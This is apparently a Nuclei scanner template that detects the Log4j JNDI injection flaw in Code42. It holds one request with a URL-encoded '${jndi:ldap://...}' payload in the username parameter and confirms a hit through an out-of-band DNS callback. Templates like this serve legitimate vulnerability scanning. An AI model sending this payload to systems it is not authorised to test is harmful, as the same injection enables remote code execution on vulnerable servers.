id: log4j-code42-rce
info:
  author: Adam Crosser
  description: Remote code execution via log4j vulnerability
  name: Log4j Code42 RCE
  severity: critical
  tags: rce
requests:
- raw: null
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=%24%7Bjndi%3Aldap%3A%2F%2F{{interactsh-url}}%7D&url=https://localhost'
  stop-at-first-match: true
